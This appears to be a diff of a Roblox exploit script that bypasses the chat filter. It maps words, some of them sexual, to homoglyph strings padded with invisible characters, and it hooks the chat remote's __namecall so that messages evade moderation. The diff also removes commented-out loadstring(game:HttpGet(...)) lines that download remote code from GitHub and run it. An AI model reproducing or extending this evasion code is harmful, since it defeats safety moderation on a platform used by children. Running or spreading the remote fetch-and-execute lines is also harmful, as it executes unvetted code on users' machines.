@@ -1,11 +1,3 @@
-
---loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
---ѕ
---⁥⁥⁥⁥⁥⁥⁥⁥⁥
---υ
---⁥і
---loadstring(game:HttpGet("https://raw.githubusercontent.com/wspo23e/sadsdaasddsa/main/sadsasdasdasdsdasdaasd"))()
-
 local Bypasses = {
     ["big"] = "В⁥⁥⁥⁥⁥⁥⁥⁥і⁥⁥⁥⁥⁥⁥⁥⁥⁥g",
     ["people"] = "р⁥⁥⁥⁥⁥⁥⁥⁥⁥е⁥⁥⁥⁥⁥⁥⁥⁥⁥о⁥⁥⁥⁥⁥⁥⁥⁥⁥р⁥⁥⁥⁥⁥⁥⁥⁥⁥l⁥⁥⁥⁥⁥⁥⁥⁥⁥е",
@@ -97,7 +89,7 @@ local Bypasses = {
     ["something"] = "ѕоmе⁥⁥⁥⁥th⁥⁥⁥⁥ing",
     ["has"] = "hа⁥⁥⁥ѕ",
     ["hey"] = "hе⁥⁥⁥⁥у",
-    ["moaning"] = "mоа⁥⁥⁥⁥ning",
+  --//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////  ["moaning"] = "mоа⁥⁥⁥⁥ning",
     ["ice"] = "iс⁥⁥⁥⁥е",
     ["sex"] = "s⁥⁥⁥⁥ес",
     ["human"] = "hu⁥⁥⁥m⁥⁥⁥аn",
@@ -276,4 +268,3 @@ local ChatBypass; ChatBypass = hookmetamethod(Remote, "__namecall", function(sel
     
     return ChatBypass(self, ...)
 end)
---wow
